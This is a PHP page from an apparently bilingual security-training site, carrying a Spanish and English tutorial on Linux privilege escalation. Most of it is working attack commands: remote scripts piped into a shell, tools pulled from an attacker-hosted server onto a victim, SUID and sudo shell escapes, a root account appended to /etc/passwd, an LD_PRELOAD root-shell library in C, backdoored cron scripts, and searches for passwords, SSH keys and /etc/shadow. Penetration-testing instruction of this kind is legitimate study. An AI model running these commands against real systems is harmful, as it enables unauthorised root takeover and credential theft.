<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Escalada de Privilegios en Linux — CyberEscudo' : 'Linux Privilege Escalation — CyberEscudo';
$contentTitle = $lang==='es' ? 'Escalada de Privilegios en Linux' : 'Linux Privilege Escalation';
$contentDate  = '2024-07-15';
$contentDiff  = 'advanced';
$contentTags  = ['Privilege Escalation','LinPEAS','SUID','Sudo','Cron','Linux'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>La <strong>escalada de privilegios</strong> consiste en explotar configuraciones incorrectas o vulnerabilidades para pasar de un usuario con pocos permisos (<code>www-data</code>, usuario normal) a <code>root</code>. Es una fase crítica en cualquier intrusión real o CTF.</p>

  <h2>1. Enumeración automática con LinPEAS</h2>
  <pre><code># Descargar y ejecutar LinPEAS desde el objetivo:
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Transferir desde tu máquina atacante (servidor HTTP):
# En atacante:
python3 -m http.server 8000

# En víctima:
wget http://TU_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Solo mostrar hallazgos de alta criticidad (amarillo/rojo):
/tmp/linpeas.sh -a 2>/dev/null | grep -E "\[.\+.\]|\[!\]"</code></pre>

  <h2>2. Binarios SUID/SGID explotables</h2>
  <pre><code># Buscar binarios con bit SUID activado:
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Buscar binarios SGID:
find / -perm -2000 -type f 2>/dev/null

# Ejemplos de binarios SUID peligrosos:
# /usr/bin/find — ejecutar comandos como root:
find /tmp -exec /bin/bash -p \; 2>/dev/null

# /usr/bin/vim — abrir shell:
vim -c ':!/bin/bash'

# /usr/bin/python3:
python3 -c 'import os; os.execl("/bin/bash","bash","-p")'

# /usr/bin/cp — sobrescribir /etc/passwd:
openssl passwd -1 hacked123
cp /etc/passwd /tmp/passwd.bak
echo "hacker:HASH_GENERADO:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker</code></pre>

  <h2>3. Sudo mal configurado</h2>
  <pre><code># Ver qué puede ejecutar el usuario actual como sudo:
sudo -l

# Ejemplos típicos explotables:

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# dentro de less: !bash

# (ALL) NOPASSWD: /usr/bin/nano o vim
sudo nano /etc/sudoers
# Añadir: tu_usuario ALL=(ALL) NOPASSWD: ALL

# sudo con variable de entorno (LD_PRELOAD):
# Si env_keep+=LD_PRELOAD en /etc/sudoers:
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so cualquier_comando_permitido</code></pre>

  <h2>4. Tareas cron y scripts con permisos débiles</h2>
  <pre><code># Listar crons del sistema:
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/
crontab -l

# Monitorizar procesos para detectar crons en ejecución:
# Instalar pspy64 en la víctima:
wget http://TU_IP:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64

# Si un cron ejecuta un script escribible por nosotros:
ls -la /ruta/al/script.sh
# Si tenemos escritura:
echo 'chmod +s /bin/bash' >> /ruta/al/script.sh
# Esperar a que se ejecute el cron, luego:
/bin/bash -p</code></pre>

  <h2>5. Contraseñas en texto claro y credenciales</h2>
  <pre><code># Buscar contraseñas hardcodeadas en ficheros de configuración:
grep -r "password" /etc/ 2>/dev/null | grep -v "^Binary"
grep -r "passwd\|secret\|credential" /var/www/ 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Historial de comandos:
cat ~/.bash_history
cat ~/.zsh_history

# Ficheros interesantes en home:
find /home -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
find /root -readable 2>/dev/null

# Base de datos SQLite con hashes:
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null</code></pre>

  <h2>6. Servicios internos (port forwarding)</h2>
  <pre><code># Ver puertos abiertos solo en localhost:
ss -tlnp
netstat -tlnp 2>/dev/null

# Si hay un servicio en 127.0.0.1:8080 no expuesto:
# Redirigir a nuestra máquina con SSH:
ssh -L 8080:127.0.0.1:8080 usuario@victima

# Acceder desde nuestro navegador a localhost:8080</code></pre>

  <h2>7. Escalada por pertenencia a grupos</h2>
  <pre><code># Ver grupos del usuario actual:
id
groups

# Grupos peligrosos y su explotación:
# docker: montar el sistema de archivos del host:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# disk: leer bloques del disco directamente:
debugfs /dev/sda1
debugfs: cat /etc/shadow

# lxd/lxc: similar a Docker:
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test mydev disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test /bin/sh

# adm/syslog: leer logs del sistema:
cat /var/log/auth.log | grep "password"</code></pre>

  <h2>8. Checklist de escalada de privilegios</h2>
  <table>
    <thead><tr><th>Vector</th><th>Comando de verificación</th></tr></thead>
    <tbody>
      <tr><td>SUID peligrosos</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td></tr>
      <tr><td>Sudo permisos</td><td><code>sudo -l</code></td></tr>
      <tr><td>Crons del sistema</td><td><code>cat /etc/crontab</code></td></tr>
      <tr><td>Procesos en tiempo real</td><td><code>./pspy64</code></td></tr>
      <tr><td>Contraseñas en configs</td><td><code>grep -r "password" /etc/ 2>/dev/null</code></td></tr>
      <tr><td>Puertos internos</td><td><code>ss -tlnp</code></td></tr>
      <tr><td>Grupos peligrosos</td><td><code>id</code> → docker, disk, lxd</td></tr>
      <tr><td>Enumeración automática</td><td><code>./linpeas.sh</code></td></tr>
    </tbody>
  </table>
</div>
<?php else: ?>
<div class="prose">
  <p><strong>Privilege escalation</strong> involves exploiting misconfigurations or vulnerabilities to move from a low-privileged user (<code>www-data</code>, normal user) to <code>root</code>. It is a critical phase in any real-world intrusion or CTF challenge.</p>

  <h2>1. Automated Enumeration with LinPEAS</h2>
  <pre><code># Download and run LinPEAS directly on target:
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Transfer from attacker machine (HTTP server):
# On attacker:
python3 -m http.server 8000

# On victim:
wget http://YOUR_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Show only high-criticality findings:
/tmp/linpeas.sh -a 2>/dev/null | grep -E "\[.\+.\]|\[!\]"</code></pre>

  <h2>2. Exploitable SUID/SGID Binaries</h2>
  <pre><code># Find SUID binaries:
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Dangerous SUID examples:
# /usr/bin/find — execute command as root:
find /tmp -exec /bin/bash -p \; 2>/dev/null

# /usr/bin/vim — open shell:
vim -c ':!/bin/bash'

# /usr/bin/python3:
python3 -c 'import os; os.execl("/bin/bash","bash","-p")'

# /usr/bin/cp — overwrite /etc/passwd:
openssl passwd -1 hacked123
echo "hacker:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker</code></pre>

  <h2>3. Misconfigured Sudo</h2>
  <pre><code># Check allowed sudo commands:
sudo -l

# Common exploitable entries:

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# inside less: !bash

# LD_PRELOAD technique (if env_keep+=LD_PRELOAD in sudoers):
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so allowed_command</code></pre>

  <h2>4. Cron Jobs & Weak Script Permissions</h2>
  <pre><code># List system cron jobs:
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/
crontab -l

# Monitor running processes to catch crons (pspy64):
wget http://YOUR_IP:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64

# If a cron executes a script we can write to:
echo 'chmod +s /bin/bash' >> /path/to/script.sh
# Wait for cron to run, then:
/bin/bash -p</code></pre>

  <h2>5. Cleartext Passwords & Credentials</h2>
  <pre><code># Search for hardcoded passwords:
grep -r "password" /etc/ 2>/dev/null | grep -v "^Binary"
grep -r "passwd\|secret\|credential" /var/www/ 2>/dev/null

# Command history:
cat ~/.bash_history
cat ~/.zsh_history

# SSH keys:
find /home -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null

# SQLite databases with hashes:
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null</code></pre>

  <h2>6. Internal Services (Port Forwarding)</h2>
  <pre><code># Find services only listening on localhost:
ss -tlnp
netstat -tlnp 2>/dev/null

# Forward internal port to attacker machine via SSH:
ssh -L 8080:127.0.0.1:8080 user@victim

# Access from browser at localhost:8080</code></pre>

  <h2>7. Dangerous Group Membership</h2>
  <pre><code># Check current user groups:
id
groups

# docker group — mount host filesystem:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# disk group — read disk blocks directly:
debugfs /dev/sda1
debugfs: cat /etc/shadow

# lxd/lxc group:
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test mydev disk source=/ path=/mnt/root recursive=true
lxc start test && lxc exec test /bin/sh</code></pre>

  <h2>8. Privilege Escalation Checklist</h2>
  <table>
    <thead><tr><th>Vector</th><th>Check Command</th></tr></thead>
    <tbody>
      <tr><td>Dangerous SUID</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td></tr>
      <tr><td>Sudo permissions</td><td><code>sudo -l</code></td></tr>
      <tr><td>System cron jobs</td><td><code>cat /etc/crontab</code></td></tr>
      <tr><td>Live processes</td><td><code>./pspy64</code></td></tr>
      <tr><td>Passwords in configs</td><td><code>grep -r "password" /etc/ 2>/dev/null</code></td></tr>
      <tr><td>Internal ports</td><td><code>ss -tlnp</code></td></tr>
      <tr><td>Dangerous groups</td><td><code>id</code> → docker, disk, lxd</td></tr>
      <tr><td>Auto-enumeration</td><td><code>./linpeas.sh</code></td></tr>
    </tbody>
  </table>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
